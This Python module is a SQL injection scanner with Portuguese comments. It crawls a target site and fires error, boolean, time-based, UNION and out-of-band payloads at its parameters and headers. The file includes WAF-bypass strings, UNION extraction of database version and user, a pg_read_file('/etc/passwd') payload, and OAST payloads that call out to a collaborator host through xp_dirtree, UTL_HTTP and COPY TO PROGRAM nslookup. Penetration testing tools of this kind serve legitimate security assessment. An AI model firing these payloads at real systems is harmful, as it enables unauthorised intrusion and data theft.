# -*- coding: utf-8 -*-
"""
SQL Injection Scanner Module
Módulo para detecção de vulnerabilidades de SQL Injection com múltiplos níveis e técnicas.
"""

import requests
import re
import time
import random
import string
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
from difflib import SequenceMatcher
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn

from ..core.logger import get_logger
from ..utils.network import create_session

# Import metadata for help system
try:
    from .sql_injection_scanner_metadata import METADATA
except ImportError:
    METADATA = None

# Register module with help system
if METADATA:
    try:
        from ..core.help_system import register_module
        register_module(METADATA)
    except ImportError:
        pass


class SQLiScanner:
    """Classe para realizar scans de SQL Injection com múltiplos níveis e técnicas."""

    def __init__(self, base_url, level=1, dbms=None, collaborator_url=None):
        self.base_url = base_url
        self.session = create_session()
        self.vulnerable_points = []
        self.level = level
        self.dbms = dbms.lower() if dbms else None
        self.collaborator_url = collaborator_url
        self.waf_detected = None
        self.db_fingerprint = None
        self.confirmed_vulns = []
        self.statistics = {
            'total_tests': 0,
            'vulnerabilities_found': 0,
            'false_positives_filtered': 0,
            'waf_bypasses': 0,
            'confirmed_vulns': 0,
            'oast_payloads_sent': 0
        }
        
        self.logger = get_logger(__name__)
        self.console = Console()
        
        # Assinaturas de WAF/IPS
        self.waf_signatures = {
            'cloudflare': {
                'headers': [r'cf-ray', r'cloudflare', r'__cfduid'],
                'content': [r'cloudflare', r'attention required', r'checking your browser'],
                'status_codes': [403, 503]
            },
            'akamai': {
                'headers': [r'akamai', r'ghost'],
                'content': [r'reference.*18\\..*\\.\\d+\\.\\d+'],
                'status_codes': [403]
            },
            'aws_waf': {
                'headers': [r'awselb', r'x-amzn'],
                'content': [r'aws', r'request blocked'],
                'status_codes': [403]
            },
            'mod_security': {
                'headers': [r'mod_security', r'modsecurity'],
                'content': [r'mod_security', r'not acceptable', r'reference id'],
                'status_codes': [403, 406]
            },
            'imperva': {
                'headers': [r'x-iinfo'],
                'content': [r'imperva', r'incapsula'],
                'status_codes': [403]
            }
        }
        
        # Payloads estruturados por tipo para serem ativados por nível
        self.payloads = {
            "error_based": {
                "basic": ["'", "\"", "')", ";'", ";", "' AND 'x'='y"],
                "intermediate": [
                    "' /*!50000AND*/ 'x'='y",
                    "'%20AND%201=0",
                    "' AND 1=IF(1,0,1)"
                ],
                "advanced": [
                    "' OR '(SELECT 1 FROM (SELECT SLEEP(1))A)'",
                    "' AND (SELECT * FROM (SELECT(SLEEP(1)))a)",
                    "' `(SELECT 1 FROM (SELECT SLEEP(1))A)` '"
                ]
            },
            "boolean_based": {
                "true": {
                    "basic": ["' OR '1'='1", " OR 1=1", "' OR 1=1--", " OR 1=1--", "' OR 1=1#", " OR 1=1#"],
                    "intermediate": [
                        "' /*!50000OR*/ 1=1",
                        "' OR 1 IN (1)",
                        "' OR 'a'='a'"
                    ],
                    "advanced": [
                        "' OR 1=1 AND 'a'='a'",
                        "' OR 1=1 AND 'a' LIKE 'a'",
                        "' OR 1=1 AND 'a' RLIKE 'a'"
                    ]
                },
                "false": {
                    "basic": ["' AND '1'='2", " AND 1=2", "' AND 1=2--", " AND 1=2--", "' AND 1=2#", " AND 1=2#"],
                    "intermediate": [
                        "' /*!50000AND*/ 1=2",
                        "' AND 1 IN (2)",
                        "' AND 'a'='b'"
                    ],
                    "advanced": [
                        "' AND 1=2 AND 'a'='a'",
                        "' AND 1=2 AND 'a' LIKE 'a'",
                        "' AND 1=2 AND 'a' RLIKE 'a'"
                    ]
                }
            },
            "time_based": {
                "mysql": {
                    "basic": "' AND SLEEP(5)--",
                    "evasive": "' /*comment*/ AND /*comment*/ SLEEP(5)--",
                    "advanced": "' /*!50000AND*/ SLEEP(5)--"
                },
                "postgresql": {
                    "basic": "' AND pg_sleep(5)--",
                    "evasive": "' /*comment*/ AND /*comment*/ pg_sleep(5)--",
                    "advanced": "' AND (SELECT pg_sleep(5))--"
                },
                "mssql": {
                    "basic": "' WAITFOR DELAY '0:0:5'--",
                    "evasive": "' /*comment*/ WAITFOR /*comment*/ DELAY '0:0:5'--",
                    "advanced": ";WAITFOR DELAY '0:0:5'--"
                },
                "oracle": {
                    "basic": "' AND DBMS_LOCK.SLEEP(5)--",
                    "evasive": "' /*comment*/ AND /*comment*/ DBMS_LOCK.SLEEP(5)--",
                    "advanced": "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)--"
                },
                "sqlite": {
                    "basic": "' AND LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
                    "evasive": "' /*comment*/ AND /*comment*/ LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
                    "advanced": "' AND (SELECT LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2)))))--"
                }
            },
            "union_based": {
                "detection": ["' UNION SELECT NULL--", "' UNION ALL SELECT NULL--", "'+UNION+SELECT+NULL--"],
                "column_enum": [
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
                ],
                "data_extraction": [
                    "' UNION SELECT database(),user()--",
                    "' UNION SELECT version(),@@version_comment--",
                    "' UNION SELECT table_name,column_name FROM information_schema.columns--"
                ]
            },
            "oast_based": {
                "mssql": [
                    "'; EXEC master..xp_dirtree '//{payload_id}.{collaborator_host}/a'--",
                    "'; DECLARE @q VARCHAR(99); SET @q = '//{payload_id}.{collaborator_host}/a'; EXEC master..xp_fileexist @q--"
                ],
                "oracle": [
                    "' AND UTL_HTTP.REQUEST('http://{payload_id}.{collaborator_host}/a') IS NOT NULL--",
                    "' AND UTL_INADDR.GET_HOST_ADDRESS('{payload_id}.{collaborator_host}') IS NOT NULL--"
                ],
                "postgresql": [
                    "'; COPY (SELECT '') TO PROGRAM 'nslookup {payload_id}.{collaborator_host}'--"
                ]
            }
        }
        
        self.error_patterns = {
            "mysql": r"you have an error in your sql syntax|warning: mysql|unknown column|illegal mix of collations",
            "postgresql": r"postgres[ql]? error|unterminated quoted string|syntax error at or near",
            "mssql": r"unclosed quotation mark|incorrect syntax near|conversion failed when converting",
            "oracle": r"ora-[0-9][0-9][0-9][0-9]|quoted string not properly terminated",
            "sqlite": r"sqlite error|near \".*?\": syntax error"
        }

    # ------------------------------------------------------------------
    # Fingerprinting moderno e baseline adaptativo
    # ------------------------------------------------------------------

    def _measure_baseline_rtt(self, url: str, param: str, value: str,
                               method: str, form_data=None, samples: int = 3) -> float:
        """
        Mede o RTT médio de baseline para evitar falsos positivos em timing-based.

        Returns:
            RTT médio em segundos (mínimo 0.5 para evitar thresholds triviais).
        """
        timings = []
        safe_value = value or "spectra_baseline_1"
        for _ in range(samples):
            data = {param: safe_value} if method == 'get' else {**(form_data or {}), param: safe_value}
            _, duration, _ = self._get_page_content(url, method=method, data=data)
            if duration and duration > 0:
                timings.append(duration)
        if not timings:
            return 2.0
        return max(sum(timings) / len(timings), 0.5)

    def _union_fingerprint_columns(self, url: str, param: str, original_value: str,
                                    method: str, form_data=None) -> int:
        """
        Detecta o número de colunas usando ORDER BY N (mais silencioso que UNION SELECT NULL).
        Fallback para UNION SELECT NULL se ORDER BY falhar.

        Returns:
            Número de colunas detectado, ou 0 se não detectado.
        """
        # Técnica 1: ORDER BY N — gera erro quando N > número de colunas
        for n in range(1, 21):
            payload = f"' ORDER BY {n}--"
            content, _, _ = self._execute_test_payload(
                url, param, payload, original_value, method, form_data
            )
            if content and any(
                re.search(p, content, re.IGNORECASE)
                for p in self.error_patterns.values()
            ):
                # O erro ocorre em N → colunas = N-1
                return max(n - 1, 1)

        # Técnica 2: Fallback UNION SELECT NULL (até 15 colunas)
        for col_count in range(1, 16):
            payload = f"' UNION SELECT {', '.join(['NULL'] * col_count)}--"
            content, _, _ = self._execute_test_payload(
                url, param, payload, original_value, method, form_data
            )
            if content and not any(
                re.search(p, content, re.IGNORECASE)
                for p in self.error_patterns.values()
            ):
                return col_count
        return 0

    def _get_dbms_error_payloads(self, dbms: str | None = None) -> list[str]:
        """
        Retorna payloads de extração de erro específicos por DBMS.

        Estes extraem a versão/usuário diretamente via mensagem de erro,
        como alternativa a UNION-based quando o output não é refletido.
        """
        all_payloads = {
            "mysql": [
                # extractvalue() — exige MySQL >= 5.1
                "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
                "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
                "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
                # updatexml()
                "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--",
                # Double query
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x "
                "FROM information_schema.tables GROUP BY x)a)--",
            ],
            "postgresql": [
                # CAST :: erro de tipo
                "' AND CAST((SELECT version()) AS INT)--",
                "' AND CAST((SELECT current_user) AS INT)--",
                "' AND 1=CAST((SELECT pg_read_file('/etc/passwd')) AS INT)--",
                # Erro de divisão
                "' AND 1/(SELECT 1 WHERE 1=CAST((SELECT version()) AS INT))--",
            ],
            "mssql": [
                # CONVERT com tipo incompatível
                "' AND 1=CONVERT(INT,(SELECT @@version))--",
                "' AND 1=CONVERT(INT,(SELECT system_user))--",
                # Error message via db_name
                "' AND db_name()>0--",
                "'; SELECT 1/0--",
            ],
            "oracle": [
                "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||"
                "(SELECT version FROM v$instance)||CHR(62))) FROM dual)--",
            ],
        }

        if dbms and dbms in all_payloads:
            return all_payloads[dbms]

        # Sem DBMS definido: retorna todos (útil para auto-detecção)
        combined = []
        for payloads in all_payloads.values():
            combined.extend(payloads)
        return combined

    def _get_page_content(self, url, method='get', data=None, headers=None, timeout=7):
        """Obtém o conteúdo de uma página e o tempo de resposta, com suporte a headers customizados."""
        final_headers = self.session.headers.copy()
        if headers:
            final_headers.update(headers)
        try:
            start_time = time.time()
            if method.lower() == 'get':
                response = self.session.get(url, params=data, headers=final_headers, timeout=timeout, verify=False)
            else:
                response = self.session.post(url, data=data, headers=final_headers, timeout=timeout, verify=False)
            duration = time.time() - start_time
            return response.text, duration, response
        except requests.exceptions.RequestException:
            return None, 0, None

    def _execute_test_payload(self, url, param, payload, original_value, method, form_data, timeout=7):
        """Executa um único payload de teste, tratando parâmetros e cabeçalhos."""
        test_value = (original_value or "") + payload
        
        req_kwargs = {'url': url, 'timeout': timeout}
        if method == 'header_get':
            req_kwargs['method'] = 'get'
            req_kwargs['headers'] = {param: test_value}
        else:
            req_kwargs['method'] = method
            req_kwargs['data'] = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            
        return self._get_page_content(**req_kwargs)

    def _add_finding(self, risk, v_type, detail, recommendation):
        """Adiciona uma nova descoberta, evitando duplicados."""
        self.logger.info(f"Vulnerabilidade detectada: {v_type} - {detail}")
        self.console.print(f"[bold red][VULNERABLE][/bold red] {v_type} detectada. Detalhes: {detail}")
        finding = {"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation}
        if finding not in self.vulnerable_points: 
            self.vulnerable_points.append(finding)
            self.statistics['vulnerabilities_found'] += 1
    
    def _detect_waf(self, response):
        """Detecta presença de WAF baseado em headers, conteúdo e status codes."""
        if not response:
            return None
            
        response_headers = ' '.join([f'{k}: {v}' for k, v in response.headers.items()]).lower()
        response_content = response.text.lower()
        status_code = response.status_code
        
        for waf_name, signatures in self.waf_signatures.items():
            # Verifica headers
            for header_pattern in signatures['headers']:
                if re.search(header_pattern, response_headers, re.IGNORECASE):
                    return waf_name
            
            # Verifica conteúdo
            for content_pattern in signatures['content']:
                if re.search(content_pattern, response_content, re.IGNORECASE):
                    return waf_name
            
            # Verifica status codes
            if status_code in signatures['status_codes']:
                # Confirma com padrões de conteúdo se disponível
                if signatures['content'] and any(re.search(pattern, response_content, re.IGNORECASE) 
                                               for pattern in signatures['content']):
                    return waf_name
        
        return None
    
    def _test_waf_bypass(self, url, param, original_value, method, form_data=None):
        """Testa técnicas de bypass de WAF."""
        bypass_techniques = [
            "' /*comment*/ OR /*comment*/ '1'='1",
            "' /*!50000OR*/ '1'='1",
            "' %0aOR%0a '1'='1",
            "'+OR+ASCII(SUBSTR((SELECT+database()),1,1))>0--",
            "'/**/OR/**/'1'='1",
            "' OR 'x'='x' AND 'y'='y"
        ]
        
        for technique in bypass_techniques:
            test_value = (original_value or "") + technique
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            
            try:
                if method.lower() == 'get':
                    response = self.session.get(url, params=data, timeout=7, verify=False)
                else:
                    response = self.session.post(url, data=data, timeout=7, verify=False)
                
                # Se não há bloqueio (status 200), é um possível bypass
                if response.status_code == 200:
                    waf = self._detect_waf(response)
                    if not waf:  # WAF não detectado = possível bypass
                        self.statistics['waf_bypasses'] += 1
                        return technique, response
                        
            except requests.exceptions.RequestException:
                continue
        
        return None, None
    
    def _confirm_vulnerability(self, url, param, original_value, method, form_data, payload_type, payload):
        """Confirma vulnerabilidade com múltiplos testes."""
        confirmations = 0
        tests = 3
        
        for _ in range(tests):
            test_value = (original_value or "") + payload
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            content, duration, _ = self._get_page_content(url, method=method, data=data)
            
            if content:
                if payload_type == "error_based":
                    for _, pattern in self.error_patterns.items():
                        if re.search(pattern, content, re.IGNORECASE):
                            confirmations += 1
                            break
                elif payload_type == "time_based":
                    if duration > 4.5:
                        confirmations += 1
                # Adicionar outras confirmações conforme necessário
        
        # Considera confirmado se 2 de 3 testes passarem
        if confirmations >= 2:
            self.statistics['confirmed_vulns'] += 1
            return True
        else:
            self.statistics['false_positives_filtered'] += 1
            return False
    
    def _fingerprint_database(self, url, param, original_value, method, form_data=None):
        """Tenta identificar o tipo de banco de dados."""
        fingerprint_tests = {
            'mysql': "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            'postgresql': "' AND (SELECT COUNT(*) FROM pg_tables)>0--", 
            'mssql': "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
            'oracle': "' AND (SELECT COUNT(*) FROM all_tables)>0--",
            'sqlite': "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
        }
        
        for db_type, test_payload in fingerprint_tests.items():
            test_value = (original_value or "") + test_payload
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            content, _, _ = self._get_page_content(url, method=method, data=data)
            
            if content and not any(re.search(pattern, content, re.IGNORECASE) 
                                 for pattern in self.error_patterns.values()):
                return db_type
        
        return None
    
    def _test_union_based(self, url, param, original_value, method, form_data=None):
        """Testa injeção UNION-based, identificando colunas de texto para extração precisa."""
        self.console.print(f"  [cyan][INFO][/cyan] Testando UNION-based no parâmetro [bold]{param}[/bold]")
        
        # 1. Detectar o número de colunas
        columns_detected = 0
        for col_count in range(1, 15): # Aumentado para 15 colunas
            payload = f"' UNION SELECT {', '.join(['NULL'] * col_count)}-- "
            content, _, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data)
            if content and not any(re.search(p, content, re.IGNORECASE) for p in self.error_patterns.values()):
                self.console.print(f"    [green]Detectado {col_count} colunas.[/green]")
                columns_detected = col_count
                break

        if not columns_detected:
            return False

        # 2. Identificar quais colunas aceitam texto
        magic_string = "SpectraTest"
        text_columns = []
        for i in range(columns_detected):
            nulls = ['NULL'] * columns_detected
            nulls[i] = f"'{magic_string}'"
            payload = f"' UNION SELECT {', '.join(nulls)}-- "
            content, _, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data)
            if content and magic_string in content:
                text_columns.append(i)
        
        if not text_columns:
            self.console.print("    [yellow]Nenhuma coluna de texto encontrada para extração.[/yellow]")
            # Ainda assim, é uma vulnerabilidade, pois o UNION foi bem-sucedido
            self._add_finding("Médio", "SQL Injection (UNION)", 
                            f"Parâmetro '{param}' em {url} ({method.upper()})", 
                            f"UNION-based vulnerável com {columns_detected} colunas, mas nenhuma coluna de texto foi identificada para extração.")
            return True

        self.console.print(f"    [green]Colunas de texto encontradas: {text_columns}[/green]")

        # 3. Extrair dados usando as colunas de texto identificadas
        db_info_payloads = {
            "Version": "version()",
            "User": "user()",
            "Database": "database()"
        }

        for info_name, info_payload in db_info_payloads.items():
            nulls = ['NULL'] * columns_detected
            nulls[text_columns[0]] = info_payload # Usa a primeira coluna de texto encontrada
            payload = f"' UNION SELECT {', '.join(nulls)}-- "
            
            content, _, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data)
            
            # Tenta extrair a informação refletida
            match = re.search(rf'>([^<]+?){magic_string}([^<]+?)<|{magic_string}([^<]+?)', content)
            extracted_data = ""
            if match:
                # Concatena todos os grupos para formar o dado extraído
                extracted_data = ''.join(filter(None, match.groups()))

            if extracted_data:
                self.console.print(f"    [bold green]Extraído {info_name}:[/bold green] {extracted_data}")
                self._add_finding("Alto", "SQL Injection (UNION)", 
                                f"Parâmetro '{param}' em {url} ({method.upper()})", 
                                f"Extraído {info_name}: {extracted_data} via UNION-based. Payload: '{payload}'")
                return True # Para após a primeira extração bem-sucedida

        return False

    def _test_param(self, url, param, original_value, method, form_data=None):
        """Testa um único parâmetro ou cabeçalho com base no nível de scan definido."""
        self.statistics['total_tests'] += 1
        injection_point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
        self.console.print(f"[cyan][INFO][/cyan] Testando {injection_point_type} [bold]{param}[/bold] em {url}")
        
        # Detecção inicial de WAF
        _, _, test_response = self._execute_test_payload(url, param, "'", original_value, method, form_data)
        if test_response:
            detected_waf = self._detect_waf(test_response)
            if detected_waf and not self.waf_detected:
                self.waf_detected = detected_waf
                self.console.print(f"[bold yellow]⚠️  WAF Detectado: {detected_waf.upper()}[/bold yellow]")
        
        # Fingerprinting do banco
        if not self.db_fingerprint and not self.dbms:
            self.db_fingerprint = self._fingerprint_database(url, param, original_value, method, form_data)
            if self.db_fingerprint:
                self.console.print(f"[bold cyan]🔍 Banco identificado: {self.db_fingerprint.upper()}[/bold cyan]")
        
        # Execução dos testes por nível
        if self.level >= 1 and self._test_error_based(url, param, original_value, method, form_data): return
        if self.level >= 2 and self._test_boolean_based(url, param, original_value, method, form_data): return
        if self.level >= 3:
            if self._test_time_based(url, param, original_value, method, form_data): return
            if self._test_oast_based(url, param, original_value, method, form_data): return

    def _test_error_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção baseada em erros com escalonamento de payloads."""
        self.console.print(f"  [cyan][INFO][/cyan] Testando Error-Based (Nível 1)...")
        payload_levels = ['basic']
        if self.waf_detected or self.level > 1: # Escala se WAF ou nível alto
            payload_levels.extend(['intermediate', 'advanced'])

        for level in payload_levels:
            for payload in self.payloads["error_based"][level]:
                content, _, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data)
                if content:
                    db_patterns = {self.dbms: self.error_patterns[self.dbms]} if self.dbms else self.error_patterns
                    for db, pattern in db_patterns.items():
                        if re.search(pattern, content, re.IGNORECASE):
                            if self._confirm_vulnerability(url, param, original_value, method, form_data, "error_based", payload):
                                point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                                detail = f"{point_type} '{param}' em {url} ({method.upper()})"
                                recomm = f"Técnica: Error-Based ({level}). Payload: '{payload}'. BD Provável: {db.capitalize()}"
                                self._add_finding("Alto", "SQL Injection", detail, recomm)
                                return True
        return False

    def _test_boolean_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção booleana cega com escalonamento de payloads."""
        self.console.print(f"  [cyan][INFO][/cyan] Testando Boolean-Based (Nível 2)...")
        
        if method == 'header_get':
            original_content, _, _ = self._get_page_content(url, headers={param: original_value})
        else:
            original_data = {param: original_value} if method == 'get' else form_data
            original_content, _, _ = self._get_page_content(url, method=method, data=original_data)
        if not original_content: return False

        payload_levels = ['basic']
        if self.waf_detected or self.level > 2:
            payload_levels.extend(['intermediate', 'advanced'])

        for level in payload_levels:
            for true_payload in self.payloads["boolean_based"]["true"][level]:
                true_content, _, _ = self._execute_test_payload(url, param, true_payload, original_value, method, form_data)
                if true_content and SequenceMatcher(None, original_content, true_content).ratio() > 0.95:
                    for false_payload in self.payloads["boolean_based"]["false"][level]:
                        false_content, _, _ = self._execute_test_payload(url, param, false_payload, original_value, method, form_data)
                        if false_content and SequenceMatcher(None, original_content, false_content).ratio() < 0.9:
                            if self._confirm_vulnerability(url, param, original_value, method, form_data, "boolean_based", true_payload):
                                point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                                detail = f"{point_type} '{param}' em {url} ({method.upper()})"
                                recomm = f"Técnica: Boolean-Based ({level}). Payload: '{true_payload}'"
                                self._add_finding("Alto", "SQL Injection", detail, recomm)
                                return True
        return False

    def _test_time_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção cega baseada em tempo."""
        self.console.print(f"  [cyan][INFO][/cyan] Testando Time-Based (Nível 3)...")
        db_to_use = self.dbms or self.db_fingerprint
        databases_to_test = {db_to_use: self.payloads["time_based"][db_to_use]} if db_to_use else self.payloads["time_based"]

        for db, payload_dict in databases_to_test.items():
            payload = payload_dict['basic']
            _, duration, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data, timeout=10)
            if duration > 4.5:
                if self._confirm_vulnerability(url, param, original_value, method, form_data, "time_based", payload):
                    point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                    detail = f"{point_type} '{param}' em {url} ({method.upper()})"
                    recomm = f"Técnica: Time-Based Blind. Payload: '{payload}'. BD Provável: {db.capitalize()}"
                    self._add_finding("Alto", "SQL Injection", detail, recomm)
                    return True
        return False

    def _test_oast_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção Out-of-Band (OAST)."""
        if not self.collaborator_url: return False

        self.console.print(f"  [cyan][INFO][/cyan] Testando Out-of-Band (Nível 3)...")
        db_to_use = self.dbms or self.db_fingerprint
        databases_to_test = {db_to_use: self.payloads["oast_based"][db_to_use]} if db_to_use else self.payloads["oast_based"]
        
        collaborator_host = urlparse(self.collaborator_url).netloc or self.collaborator_url

        for _, payload_list in databases_to_test.items():
            for payload_template in payload_list:
                payload_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                formatted_payload = payload_template.format(payload_id=payload_id, collaborator_host=collaborator_host)
                
                self._execute_test_payload(url, param, formatted_payload, original_value, method, form_data)
                self.statistics['oast_payloads_sent'] += 1
                
                point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                detail = f"{point_type} '{param}' em {url} ({method.upper()})"
                recomm = f"Verifique seu servidor OAST ({collaborator_host}) por interações com ID: {payload_id}"
                self._add_finding("Alto", "SQLi (Potencial OAST)", detail, recomm)
                return True
        return False

    def run_scan(self, return_findings=False):
        """Executa o scan de SQLi, descobrindo pontos de entrada e testando-os."""
        if not return_findings:
            self.console.print("-" * 60)
            self.console.print(f"[*] Executando scanner de SQL Injection em: [bold cyan]{self.base_url}[/bold cyan]")
            self.console.print(f"[*] Nível de scan: [bold yellow]{self.level}[/bold yellow]")
            if self.dbms:
                self.console.print(f"[*] SGBD alvo: [bold green]{self.dbms.upper()}[/bold green]")
            if self.collaborator_url:
                self.console.print(f"[*] Servidor OAST: [bold green]{self.collaborator_url}[/bold green]")
            self.console.print("-" * 60)
            
        try:
            with self.console.status("[bold green]Coletando pontos de entrada (links, formulários e cabeçalhos)...[/bold green]"):
                _, _, response = self._get_page_content(self.base_url, timeout=10)
                if not response: 
                    raise requests.RequestException("Não foi possível obter a página inicial.")
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: 
                self.console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        tasks = []
        # Coleta de links com parâmetros
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param, values in parse_qs(parsed.query).items():
                tasks.append(('get', base, param, values[0], None))
        
        # Coleta de formulários
        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            form_data = {i.get('name'): i.get('value', 'test') for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in form_data:
                tasks.append((method, action, param, form_data[param], form_data))

        # Adiciona cabeçalhos HTTP como pontos de entrada
        headers_to_test = {
            'User-Agent': self.session.headers.get('User-Agent', 'Mozilla/5.0'),
            'Referer': self.base_url,
            'Cookie': 'test=test'
        }
        for header, value in headers_to_test.items():
            tasks.append(('header_get', self.base_url, header, value, None))

        if not tasks:
            if not return_findings: 
                self.console.print("[yellow]Nenhum ponto de entrada (parâmetro, formulário ou cabeçalho) encontrado para testar.[/yellow]")
            return [] if return_findings else None
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=self.console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando SQL Injection...", total=len(tasks))
            for method, url, param, value, form_data in tasks:
                point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                progress.update(task_id, advance=1, description=f"[green]Testando {point_type} [cyan]{param}[/cyan]...")
                self._test_param(url, param, value, method, form_data)

        if return_findings: 
            return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        """Apresenta os resultados do scan de SQLi com estatísticas detalhadas."""
        self.console.print("\n[bold cyan]═══ RESULTADOS DO SCAN ═══[/bold cyan]")
        
        # Estatísticas do scan
        stats_table = Table(title="Estatísticas do Scan", show_header=True, header_style="bold yellow")
        stats_table.add_column("Métrica", style="cyan", width=25)
        stats_table.add_column("Valor", style="yellow", width=15)
        stats_table.add_column("Descrição", style="white", width=30)
        
        stats_table.add_row("Testes Realizados", str(self.statistics['total_tests']), "Total de parâmetros testados")
        stats_table.add_row("Vulnerabilidades", str(self.statistics['vulnerabilities_found']), "SQLi encontradas")
        stats_table.add_row("Confirmadas", str(self.statistics['confirmed_vulns']), "Vulnerabilidades confirmadas")
        stats_table.add_row("Falsos Positivos", str(self.statistics['false_positives_filtered']), "Filtrados pela confirmação")
        
        if self.collaborator_url:
            stats_table.add_row("Payloads OAST Enviados", str(self.statistics['oast_payloads_sent']), "Testes Out-of-Band executados")

        if self.waf_detected:
            stats_table.add_row("WAF Detectado", self.waf_detected.upper(), "Firewall de aplicação web")
            stats_table.add_row("Bypasses WAF", str(self.statistics['waf_bypasses']), "Técnicas que passaram pelo WAF")
        
        if self.db_fingerprint:
            stats_table.add_row("Banco Identificado", self.db_fingerprint.upper(), "Sistema de banco de dados")
        
        self.console.print(stats_table)
        self.console.print()
        
        # Resultados de vulnerabilidades
        if not self.vulnerable_points:
            self.console.print("[bold green]✅ NENHUMA VULNERABILIDADE ENCONTRADA[/bold green]")
            self.console.print("[green]O site aparenta estar protegido contra SQL Injection[/green]")
        else:
            self.console.print(f"[bold red]🚨 {len(self.vulnerable_points)} VULNERABILIDADE(S) ENCONTRADA(S)[/bold red]")
            
            vuln_table = Table(title="Vulnerabilidades de SQL Injection Detectadas", show_header=True, header_style="bold red")
            vuln_table.add_column("Risco", justify="center", style="bold red", width=8)
            vuln_table.add_column("Tipo", style="magenta", width=20)
            vuln_table.add_column("Localização", style="cyan", width=40)
            vuln_table.add_column("Técnica & Payload", style="yellow", width=50)
            vuln_table.add_column("Recomendação", style="white", width=35)
            
            for finding in self.vulnerable_points:
                vuln_table.add_row(
                    finding['Risco'],
                    finding['Tipo'], 
                    finding['Detalhe'],
                    finding['Recomendação'].split('.')[0] if '.' in finding['Recomendação'] else finding['Recomendação'][:50],
                    "Usar prepared statements e validação de entrada"
                )
            
            self.console.print(vuln_table)
            
            # Recomendações gerais
            self.console.print("\n[bold yellow]🛡️  RECOMENDAÇÕES DE SEGURANÇA:[/bold yellow]")
            recommendations = [
                "1. Use prepared statements/parametrized queries",
                "2. Implemente validação rigorosa de entrada",
                "3. Configure um WAF (Web Application Firewall)",
                "4. Aplique o princípio do menor privilégio no banco",
                "5. Mantenha o sistema de banco atualizado"
            ]
            for rec in recommendations:
                self.console.print(f"   [white]{rec}[/white]")
        
        self.console.print(f"\n[bold cyan]{'═' * 60}[/bold cyan]")


def sql_injection_scan(url, level=1, dbms=None, collaborator_url=None, return_findings=False):
    """
    Executa scan de SQL Injection em uma URL.
    
    Args:
        url (str): URL alvo para o scan
        level (int): Nível de agressividade do scan (1-3)
        dbms (str): Tipo de SGBD específico (mysql, postgresql, mssql, oracle, sqlite)
        collaborator_url (str): URL do servidor OAST para testes out-of-band
        return_findings (bool): Se True, retorna lista de vulnerabilidades ao invés de imprimir
    
    Returns:
        list ou None: Lista de vulnerabilidades encontradas se return_findings=True
    """
    scanner = SQLiScanner(url, level=level, dbms=dbms, collaborator_url=collaborator_url)
    return scanner.run_scan(return_findings=return_findings)
